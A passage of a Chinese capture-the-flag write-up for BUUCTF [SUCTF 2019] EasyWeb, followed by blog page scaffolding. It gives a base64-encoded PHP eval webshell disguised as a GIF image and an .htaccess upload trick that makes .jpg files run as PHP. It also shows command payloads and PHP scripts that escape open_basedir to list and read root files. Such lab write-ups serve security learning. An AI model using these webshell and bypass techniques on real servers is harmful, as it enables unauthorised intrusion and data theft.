+<h3 id="pass-jpg"><a href="#pass-jpg" class="headerlink" title="pass.jpg:"></a>pass.jpg:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">GIF89a66<br><br>PD9waHAgZWNobyAid2luISEhIjtAZXZhbCgkX1BPU1RbJ3Bhc3MnXSk7Pz4g<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2024-2-18/image-20240213222006414.png" srcset="/img/loading.gif" lazyload alt="image-20240213222006414"></p>
+<h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess:"></a>.htaccess:</h3><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><h4 id="添加XBM文件幻术头"><a href="#添加XBM文件幻术头" class="headerlink" title="添加XBM文件幻术头:"></a>添加XBM文件幻术头:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">#define width 1337<br><br>#define height 1337<br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs htaccess">#define width 1337<br><br>#define height 1337<br><br>php_value auto_prepend_file &quot;php://filter/convert.base64-decode/resource=./pass.jpg&quot;<br><br>AddType application/x-httpd-php .jpg<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2024-2-18/image-20240213222127585.png" srcset="/img/loading.gif" lazyload alt="image-20240213222127585"></p>
+<h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">在.htaccess前添加x00x00x8ax39x8ax39(要在十六进制编辑器中添加，或者使用python的bytes类型)<br>x00x00x8ax39x8ax39 是wbmp文件的文件头<br>.htaccess中以0x00开头的同样也是注释符，所以不会影响.htaccess<br></code></pre></td></tr></table></figure>
+
+<p>这里采用方法一的.htaccess文件。</p>
+<h2 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件:"></a>上传文件:</h2><h3 id="pass-jpg-1"><a href="#pass-jpg-1" class="headerlink" title="pass.jpg:"></a>pass.jpg:</h3><h4 id="上传"><a href="#上传" class="headerlink" title="上传:"></a>上传:</h4><p><img src="/images/2024-2-18/image-20240213225818685.png" srcset="/img/loading.gif" lazyload alt="image-20240213225818685"></p>
+<h4 id="响应结果"><a href="#响应结果" class="headerlink" title="响应结果:"></a>响应结果:</h4><p><img src="/images/2024-2-18/image-20240213225759507.png" srcset="/img/loading.gif" lazyload alt="image-20240213225759507"></p>
+<h3 id="htaccess-1"><a href="#htaccess-1" class="headerlink" title=".htaccess:"></a>.htaccess:</h3><h4 id="上传-1"><a href="#上传-1" class="headerlink" title="上传:"></a>上传:</h4><p><img src="/images/2024-2-18/image-20240213225924525.png" srcset="/img/loading.gif" lazyload alt="image-20240213225924525"></p>
+<h4 id="响应结果-1"><a href="#响应结果-1" class="headerlink" title="响应结果:"></a>响应结果:</h4><p><img src="/images/2024-2-18/image-20240213230120518.png" srcset="/img/loading.gif" lazyload alt="image-20240213230120518"></p>
+<h2 id="访问我们的pass-jpg"><a href="#访问我们的pass-jpg" class="headerlink" title="访问我们的pass.jpg:"></a>访问我们的pass.jpg:</h2><p><img src="/images/2024-2-18/image-20240213230241660.png" srcset="/img/loading.gif" lazyload alt="image-20240213230241660"></p>
+<h3 id="测试木马文件是否可用"><a href="#测试木马文件是否可用" class="headerlink" title="测试木马文件是否可用:"></a>测试木马文件是否可用:</h3><h4 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pass=phpinfo();<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2024-2-18/image-20240213230347611.png" srcset="/img/loading.gif" lazyload alt="image-20240213230347611"></p>
+<p>我们的木马文件可以被使用！！！</p>
+<h2 id="查看文件根目录"><a href="#查看文件根目录" class="headerlink" title="查看文件根目录:"></a>查看文件根目录:</h2><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pass=system(&#x27;ls /&#x27;);<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2024-2-18/image-20240213230511448.png" srcset="/img/loading.gif" lazyload alt="image-20240213230511448"></p>
+<p>没有回显内容，可能是对函数进行禁用了。</p>
+<h2 id="查看phpinfo-了解禁用内容"><a href="#查看phpinfo-了解禁用内容" class="headerlink" title="查看phpinfo()了解禁用内容:"></a>查看phpinfo()了解禁用内容:</h2><p><img src="/images/2024-2-18/image-20240213230650369.png" srcset="/img/loading.gif" lazyload alt="image-20240213230650369"></p>
+<p>禁用了对系统命令的使用，所以只能采取蚁剑连接了。</p>
+<h2 id="蚁剑连接木马文件"><a href="#蚁剑连接木马文件" class="headerlink" title="蚁剑连接木马文件:"></a>蚁剑连接木马文件:</h2><p><img src="/images/2024-2-18/image-20240213231219940.png" srcset="/img/loading.gif" lazyload alt="image-20240213231219940"></p>
+<h3 id="第一种方式：直接查看"><a href="#第一种方式：直接查看" class="headerlink" title="第一种方式：直接查看:"></a>第一种方式：直接查看:</h3><p>（前提是蚁剑拥有可以访问根目录中文件信息的权限）</p>
+<h4 id="查看文件的根目录信息"><a href="#查看文件的根目录信息" class="headerlink" title="查看文件的根目录信息:"></a>查看文件的根目录信息:</h4><p><img src="/images/2024-2-18/image-20240213231338423.png" srcset="/img/loading.gif" lazyload alt="image-20240213231338423"></p>
+<p>发现一个flag相关文件</p>
+<h4 id="打开THis-Is-tHe-F14g文件"><a href="#打开THis-Is-tHe-F14g文件" class="headerlink" title="打开THis_Is_tHe_F14g文件:"></a>打开THis_Is_tHe_F14g文件:</h4><p><img src="/images/2024-2-18/image-20240213231455476.png" srcset="/img/loading.gif" lazyload alt="image-20240213231455476"></p>
+<p>获得flag&#x3D;flag{7f878969-d964-4dfe-886b-00815550a1d6}</p>
+<h3 id="第二种方式：在上传文件的目录中再创建一个shell-php用于获取文件信息："><a href="#第二种方式：在上传文件的目录中再创建一个shell-php用于获取文件信息：" class="headerlink" title="第二种方式：在上传文件的目录中再创建一个shell.php用于获取文件信息："></a>第二种方式：在上传文件的目录中再创建一个shell.php用于获取文件信息：</h3><p>（蚁剑无法直接获取根目录文件内容时以及）</p>
+<h4 id="获取指定目录的文件信息"><a href="#获取指定目录的文件信息" class="headerlink" title="获取指定目录的文件信息:"></a>获取指定目录的文件信息:</h4><h5 id="新建文件shell1-php"><a href="#新建文件shell1-php" class="headerlink" title="新建文件shell1.php:"></a>新建文件shell1.php:</h5><h6 id="shell1-php"><a href="#shell1-php" class="headerlink" title="shell1.php:"></a>shell1.php:</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;south&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;south&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/&#x27;</span>));<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2024-2-18/image-20240213232539210.png" srcset="/img/loading.gif" lazyload alt="image-20240213232539210"></p>
+<p><img src="/images/2024-2-18/image-20240213232556360.png" srcset="/img/loading.gif" lazyload alt="image-20240213232556360"></p>
+<p><img src="/images/2024-2-18/image-20240213233043246.png" srcset="/img/loading.gif" lazyload alt="image-20240213233043246"></p>
+<p><img src="/images/2024-2-18/image-20240213233319227.png" srcset="/img/loading.gif" lazyload alt="image-20240213233319227"></p>
+<h5 id="网页访问我们新建的shell1-php"><a href="#网页访问我们新建的shell1-php" class="headerlink" title="网页访问我们新建的shell1.php:"></a>网页访问我们新建的shell1.php:</h5><p>(由于是在当前目录下创建的shell1.php，所以访问时还是以当前目录下的shell1.php去启动运行该文件)</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">http://4e0bb1d6-9792-4b57-9a11-3a50902dc814.node5.buuoj.cn:81/upload/tmp_f65a0ca982c669865231909b0ec85a0c/shell1.php<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2024-2-18/image-20240213233439097.png" srcset="/img/loading.gif" lazyload alt="image-20240213233439097"></p>
+<p>获得一个文件：THis_Is_tHe_F14g</p>
+<h4 id="获取指定目录下的文件的内容"><a href="#获取指定目录下的文件的内容" class="headerlink" title="获取指定目录下的文件的内容:"></a>获取指定目录下的文件的内容:</h4><h5 id="新建一个shell2-php"><a href="#新建一个shell2-php" class="headerlink" title="新建一个shell2.php:"></a>新建一个shell2.php:</h5><h6 id="shell2-php"><a href="#shell2-php" class="headerlink" title="shell2.php:"></a>shell2.php:</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;south&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;south&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/&#x27;</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;hr&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/THis_Is_tHe_F14g&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2024-2-18/image-20240213234142911.png" srcset="/img/loading.gif" lazyload alt="image-20240213234142911"></p>
+<p><img src="/images/2024-2-18/image-20240213234201910.png" srcset="/img/loading.gif" lazyload alt="image-20240213234201910"></p>
+<h5 id="网页访问我们新建的shell2-php"><a href="#网页访问我们新建的shell2-php" class="headerlink" title="网页访问我们新建的shell2.php:"></a>网页访问我们新建的shell2.php:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">http://4e0bb1d6-9792-4b57-9a11-3a50902dc814.node5.buuoj.cn:81/upload/tmp_f65a0ca982c669865231909b0ec85a0c/shell2.php<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2024-2-18/image-20240213234252121.png" srcset="/img/loading.gif" lazyload alt="image-20240213234252121"></p>
+<p>flag&#x3D;flag{7f878969-d964-4dfe-886b-00815550a1d6}</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>BUUCTF_[SUCTF 2019]EasyWeb</div>
+      <div>http://example.com/2024/02/18/2024-02-18-[SUCTF 2019]EasyWeb/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>South</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年2月18日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/02/18/2024-02-18-%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DUnfinish/" title="BUUCTF_[网鼎杯2018]Unfinish">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">BUUCTF_[网鼎杯2018]Unfinish</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/02/18/2024-02-18-%5BHarekazeCTF2019%5Dencode_and_encode/" title="BUUCTF_[HarekazeCTF2019]encode_and_encode">
+                        <span class="hidden-mobile">BUUCTF_[HarekazeCTF2019]encode_and_encode</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"ThR4XZRMA2SwXDt3MeF5vjCN-gzGzoHsz","appKey":"PmUqfFPhyiQDRYmHOO0IXjTV","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量
+        <span id="busuanzi_value_site_pv"></span>
+        次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数
+        <span id="busuanzi_value_site_uv"></span>
+        人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
